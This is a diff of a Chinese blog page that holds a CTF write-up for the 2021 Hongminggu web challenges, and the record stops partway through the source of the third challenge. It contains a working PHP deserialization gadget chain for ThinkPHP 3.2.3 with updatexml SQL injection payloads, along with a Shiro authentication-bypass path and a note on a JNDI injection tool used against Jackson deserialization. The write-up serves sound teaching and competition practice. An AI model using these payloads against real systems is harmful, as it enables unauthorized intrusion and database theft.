@@ -1,57 +1,286 @@
-<!doctype html>
-<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2021红明谷ctf web部分复现 - Hexo</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Hexo"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hexo"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="easytp报错得到thinkphp版本为3.2.3  存在备份文件www.zip  控制器中存在unserialize函数，需要利用反序列化漏洞  Thinkphp3.2.3反序列化漏洞（注入&amp;amp;文件读取） https:&amp;#x2F;&amp;#x2F;mp.weixin.qq.com&amp;#x2F;s?__biz&amp;#x3D;MzU2NDc2NDYwMA&amp;#x3D;&amp;#x3D;&amp;amp;mid&amp;#x3D;2247484711&amp;amp;idx&amp;#x3D;1&amp;amp;sn&amp;#x3D;0dd0f7"><meta property="og:type" content="blog"><meta property="og:title" content="2021红明谷ctf web部分复现"><meta property="og:url" content="http://example.com/2021/04/16/2021%E7%BA%A2%E6%98%8E%E8%B0%B7ctf-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="easytp报错得到thinkphp版本为3.2.3  存在备份文件www.zip  控制器中存在unserialize函数，需要利用反序列化漏洞  Thinkphp3.2.3反序列化漏洞（注入&amp;amp;文件读取） https:&amp;#x2F;&amp;#x2F;mp.weixin.qq.com&amp;#x2F;s?__biz&amp;#x3D;MzU2NDc2NDYwMA&amp;#x3D;&amp;#x3D;&amp;amp;mid&amp;#x3D;2247484711&amp;amp;idx&amp;#x3D;1&amp;amp;sn&amp;#x3D;0dd0f7"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.hualigs.cn/image/607984ad62c03.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984b1ae704.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984addb770.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984b31e8ea.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984b3bab18.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984b43f636.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984b433511.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984b2c7943.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984b1ea813.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984b0608bb.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984b1af091.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984b06b2e1.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984b1369ef.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984b1bafe3.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984b2acd79.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984b1086e8.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984b0513b6.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984ad4ca06.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/607984ad5bb46.jpg"><meta property="article:published_time" content="2021-04-16T12:35:38.000Z"><meta property="article:modified_time" content="2021-04-16T12:42:34.128Z"><meta property="article:author" content="John Doe"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://www.hualigs.cn/image/607984ad62c03.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2021/04/16/2021%E7%BA%A2%E6%98%8E%E8%B0%B7ctf-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"},"headline":"Hexo","image":["https://www.hualigs.cn/image/607984ad62c03.jpg","https://www.hualigs.cn/image/607984b1ae704.jpg","https://www.hualigs.cn/image/607984addb770.jpg","https://www.hualigs.cn/image/607984b31e8ea.jpg","https://www.hualigs.cn/image/607984b3bab18.jpg","https://www.hualigs.cn/image/607984b43f636.jpg","https://www.hualigs.cn/image/607984b433511.jpg","https://www.hualigs.cn/image/607984b2c7943.jpg","https://www.hualigs.cn/image/607984b1ea813.jpg","https://www.hualigs.cn/image/607984b0608bb.jpg","https://www.hualigs.cn/image/607984b1af091.jpg","https://www.hualigs.cn/image/607984b06b2e1.jpg","https://www.hualigs.cn/image/607984b1369ef.jpg","https://www.hualigs.cn/image/607984b1bafe3.jpg","https://www.hualigs.cn/image/607984b2acd79.jpg","https://www.hualigs.cn/image/607984b1086e8.jpg","https://www.hualigs.cn/image/607984b0513b6.jpg","https://www.hualigs.cn/image/607984ad4ca06.jpg","https://www.hualigs.cn/image/607984ad5bb46.jpg"],"datePublished":"2021-04-16T12:35:38.000Z","dateModified":"2021-04-16T12:42:34.128Z","author":{"@type":"Person","name":"John Doe"},"description":"easytp报错得到thinkphp版本为3.2.3  存在备份文件www.zip  控制器中存在unserialize函数，需要利用反序列化漏洞  Thinkphp3.2.3反序列化漏洞（注入&amp;文件读取） https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzU2NDc2NDYwMA&#x3D;&#x3D;&amp;mid&#x3D;2247484711&amp;idx&#x3D;1&amp;sn&#x3D;0dd0f7"}</script><link rel="canonical" href="http://example.com/2021/04/16/2021%E7%BA%A2%E6%98%8E%E8%B0%B7ctf-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-16T12:35:38.000Z" title="2021-04-16T12:35:38.000Z">2021-04-16</time>发表</span><span class="level-item"><time dateTime="2021-04-16T12:42:34.128Z" title="2021-04-16T12:42:34.128Z">2021-04-16</time>更新</span><span class="level-item">8 分钟读完 (大约1206个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">2021红明谷ctf web部分复现</h1><div class="content"><h1 id="easytp"><a href="#easytp" class="headerlink" title="easytp"></a>easytp</h1><p>报错得到thinkphp版本为3.2.3</p>
-<p><img src="https://www.hualigs.cn/image/607984ad62c03.jpg"></p>
-<p>存在备份文件<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
-<p><img src="https://www.hualigs.cn/image/607984b1ae704.jpg"></p>
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sp4z">
+  <meta name="keywords" content="">
+  
+  <title>2021红明谷ctf web部分复现 - sp4z&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="2021红明谷ctf web部分复现">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-04-16 20:35" pubdate>
+        2021年4月16日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      22
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2021红明谷ctf web部分复现</h1>
+            
+            <div class="markdown-body">
+              <h1 id="easytp"><a href="#easytp" class="headerlink" title="easytp"></a>easytp</h1><p>报错得到thinkphp版本为3.2.3</p>
+<p><img src="https://www.hualigs.cn/image/607984ad62c03.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>存在备份文件<a href="http://www.zip/">www.zip</a></p>
+<p><img src="https://www.hualigs.cn/image/607984b1ae704.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>控制器中存在unserialize函数，需要利用反序列化漏洞</p>
-<p><img src="https://www.hualigs.cn/image/607984addb770.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/607984addb770.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>Thinkphp3.2.3反序列化漏洞（注入&amp;文件读取）</p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect</a></p>
 <p>exp</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>    <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;mysql&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where 1=updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,32)),0)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
 <p>利用后得到当前数据库为mysql，需要查询其他数据库</p>
-<p><img src="https://www.hualigs.cn/image/607984b31e8ea.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/607984b31e8ea.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>发现test数据库</p>
-<p><img src="https://www.hualigs.cn/image/607984b3bab18.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/607984b3bab18.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>查询表名，发现flag</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;test&#39;),1,32)),0)#</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://www.hualigs.cn/image/607984b43f636.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/607984b43f636.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>查询flag，由于updatexml只能读取32位，需要分两次读取</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,substr((select group_concat(flag) from test.flag),1,32)),0)#</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://www.hualigs.cn/image/607984b433511.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/607984b433511.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>读取后面的flag</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,substr((select group_concat(flag) from test.flag),32,32)),0)#</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://www.hualigs.cn/image/607984b2c7943.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/607984b2c7943.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>得到flag</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7c85503e-ea45-4bfe-ac62-3f2a27998348&#125;</span><br></pre></td></tr></table></figure>
 
 
 
 <h1 id="javaweb"><a href="#javaweb" class="headerlink" title="javaweb"></a>javaweb</h1><p>访问/login，发现Set-Cookie中存在remeberMe，判断是shiro框架</p>
-<p><img src="https://www.hualigs.cn/image/607984b1ea813.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/607984b1ea813.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>存在/json，但是需要登陆才能访问</p>
-<p><img src="https://www.hualigs.cn/image/607984b0608bb.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/607984b0608bb.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>利用Apache Shiro 身份验证绕过漏洞 CVE-2020-11989</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/14055275.html">https://www.cnblogs.com/backlion/p/14055275.html</a></p>
+<p><a href="https://www.cnblogs.com/backlion/p/14055275.html">https://www.cnblogs.com/backlion/p/14055275.html</a></p>
 <p>输入<code>/;/json</code>，成功登陆，提示需要json字符串</p>
-<p><img src="https://www.hualigs.cn/image/607984b1af091.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/607984b1af091.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>测试发现可以反序列化</p>
-<p><img src="https://www.hualigs.cn/image/607984b06b2e1.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/607984b06b2e1.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>在vps中看到回显</p>
-<p><img src="https://www.hualigs.cn/image/607984b1369ef.jpg"></p>
-<p>jackson反序列化，利用工具 <a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
-<p><img src="https://www.hualigs.cn/image/607984b1bafe3.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/607984b1369ef.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>jackson反序列化，利用工具 <a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
+<p><img src="https://www.hualigs.cn/image/607984b1bafe3.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>Spring利用链，直接利用工具即可</p>
-<p><img src="https://www.hualigs.cn/image/607984b2acd79.jpg"></p>
-<p><img src="https://www.hualigs.cn/image/607984b1086e8.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/607984b2acd79.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://www.hualigs.cn/image/607984b1086e8.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>成功带出flag</p>
-<p><img src="https://www.hualigs.cn/image/607984b0513b6.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/607984b0513b6.jpg" srcset="/img/loading.gif" lazyload></p>
 <h1 id="write-shell"><a href="#write-shell" class="headerlink" title="write_shell"></a>write_shell</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          